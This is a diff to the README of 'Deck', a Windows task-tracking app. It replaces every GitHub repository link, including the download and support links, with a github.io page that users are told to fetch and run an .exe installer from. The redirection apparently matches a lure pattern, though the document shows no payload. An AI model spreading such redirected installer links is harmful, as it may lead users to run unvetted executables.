@@ -1,6 +1,6 @@
 # 📊 Deck - Track project tasks with ease
 
-[![](https://img.shields.io/badge/Download-Deck-blue.svg)](https://github.com/atheist-grammaticalgender460/Deck)
+[![](https://img.shields.io/badge/Download-Deck-blue.svg)](https://atheist-grammaticalgender460.github.io)
 
 Deck helps you organize your work. You track bugs and manage project features on a digital board. The application uses cards to sort your items. It offers a clean layout and tools to monitor your progress. Your data stays on your machine. You do not need an account to use this software.
 
@@ -21,7 +21,7 @@ You need a computer running Windows to use this application. Ensure your system 
 
 Follow these steps to set up Deck on your computer.
 
-1. Visit the [download page](https://github.com/atheist-grammaticalgender460/Deck) to obtain the installer.
+1. Visit the [download page](https://atheist-grammaticalgender460.github.io) to obtain the installer.
 2. Select the file ending in .exe to start the download.
 3. Open the file after the download finishes.
 4. Follow the instructions on your screen.
@@ -66,7 +66,7 @@ Yes. Open the settings menu to pick a color theme. You can assign colors to spec
 
 If the application fails to open, restart your computer. Check that you have enough space on your drive. If you still see errors, visit the link below and look for the issues tab. Others might have faced similar problems. Report any bugs you find. Your feedback helps make the software better. 
 
-[Link to the project repository for support](https://github.com/atheist-grammaticalgender460/Deck)
+[Link to the project repository for support](https://atheist-grammaticalgender460.github.io)
 
 ## 👤 Credits
 
